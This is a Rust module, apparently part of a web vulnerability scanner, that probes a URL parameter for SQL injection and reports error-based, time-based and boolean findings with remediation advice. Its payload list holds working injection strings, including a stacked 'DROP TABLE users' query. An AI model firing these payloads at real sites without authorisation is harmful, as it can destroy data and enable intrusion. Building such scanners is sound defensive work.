use reqwest::Client;
use url::Url;

use crate::{
    error::Result,
    report::{Finding, Severity, ScanResult},
};

static PAYLOADS: &[(&str, &str)] = &[
    ("'",                          "single-quote"),
    ("''",                         "doubled-quote"),
    ("\\",                         "backslash escape"),
    (";",                          "statement terminator"),

    ("' OR '1'='1",                "boolean OR true"),
    ("' OR '1'='2",                "boolean OR false"),
    ("1 AND 1=1",                  "integer AND true"),
    ("1 AND 1=2",                  "integer AND false"),

    ("'; WAITFOR DELAY '0:0:3'--", "MSSQL time-delay"),
    ("'; SELECT SLEEP(3)--",       "MySQL time-delay"),
 
    ("' UNION SELECT NULL--",      "UNION NULL probe"),
    ("' UNION SELECT NULL,NULL--", "UNION NULL,NULL probe"),

    ("'--",                        "comment terminator --"),
    ("'#",                         "comment terminator #"),
    ("' /*",                       "inline comment /*"),

    ("'; DROP TABLE users--",      "stacked query"),
];

static ERROR_SIGNATURES: &[&str] = &[
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "syntax error",
    "unclosed quotation",
    "quoted string not properly terminated",
    "invalid column name",
    "odbc driver",
    "sqlserver",
    "sqlite_",
    "pg_query",
    "pdo",
    "native client",
    "jdbc",
    "warning: mysql",
    "you have an error in your sql",
    "supplied argument is not a valid mysql",
    "error in your sql syntax",
    "division by zero",
    "unterminated string",
    "unexpected end of sql command",
];

const TIME_PROBE_THRESHOLD_SECS: u64 = 2;

pub async fn scan(
    client: &Client,
    url: &str,
    param: &str,
    extra_params: &[String],
) -> Result<ScanResult> {
    let mut result = ScanResult::new("sqli", url);

    let base: Url = url.parse()?;

    let extras: Vec<(String, String)> = extra_params
        .iter()
        .filter_map(|s| {
            let mut parts = s.splitn(2, '=');
            Some((parts.next()?.to_string(), parts.next()?.to_string()))
        })
        .collect();

    let baseline_url = build_url(&base, param, "1", &extras);
    let baseline_resp = client.get(baseline_url.as_str()).send().await?;
    let baseline_body = baseline_resp.text().await?.to_lowercase();
    let baseline_len  = baseline_body.len();

    for (payload, technique) in PAYLOADS {
        let test_url = build_url(&base, param, payload, &extras);

        let t0   = std::time::Instant::now();
        let resp = match client.get(test_url.as_str()).send().await {
            Ok(r)  => r,
            Err(_) => continue,
        };
        let elapsed = t0.elapsed().as_secs();
        let body    = resp.text().await?.to_lowercase();

        for sig in ERROR_SIGNATURES {
            if body.contains(sig) && !baseline_body.contains(sig) {
                result.push(
                    Finding::new(
                        Severity::Critical,
                        "SQL injection – error-based",
                        &format!(
                            "Parameter '{param}' reflects SQL error signature '{sig}' \
                             with payload: {payload} ({technique})"
                        ),
                    )
                    .with_evidence(format!("URL: {test_url}"))
                    .with_remediation(
                        "Use parameterised queries / prepared statements. \
                         Never interpolate user input into SQL.",
                    ),
                );
                break;
            }
        }

        if technique.contains("time-delay") && elapsed >= TIME_PROBE_THRESHOLD_SECS {
            result.push(
                Finding::new(
                    Severity::High,
                    "SQL injection – time-based blind (possible)",
                    &format!(
                        "Parameter '{param}' caused a {elapsed}s delay with payload '{payload}' ({technique}). \
                         May indicate time-based blind SQL injection."
                    ),
                )
                .with_evidence(format!("URL: {test_url}"))
                .with_remediation(
                    "Use parameterised queries. Investigate application query construction.",
                ),
            );
        }

        let len_diff = (body.len() as isize - baseline_len as isize).unsigned_abs();
        if len_diff > baseline_len / 2 && len_diff > 200 {
            result.push(
                Finding::new(
                    Severity::Medium,
                    "SQL injection – boolean differential (possible)",
                    &format!(
                        "Response length changed by {len_diff} bytes with payload '{payload}' ({technique}). \
                         May indicate boolean-based blind SQL injection."
                    ),
                )
                .with_evidence(format!(
                    "Baseline: {baseline_len} bytes, Test: {} bytes, URL: {test_url}",
                    body.len()
                ))
                .with_remediation(
                    "Investigate with a dedicated tool (sqlmap) to confirm. \
                     Use parameterised queries.",
                ),
            );
        }
    }

    Ok(result)
}

fn build_url(base: &Url, param: &str, value: &str, extras: &[(String, String)]) -> Url {
    let mut u = base.clone();
    {
        let mut pairs = u.query_pairs_mut();
        pairs.append_pair(param, value);
        for (k, v) in extras {
            pairs.append_pair(k, v);
        }
    }
    u
}
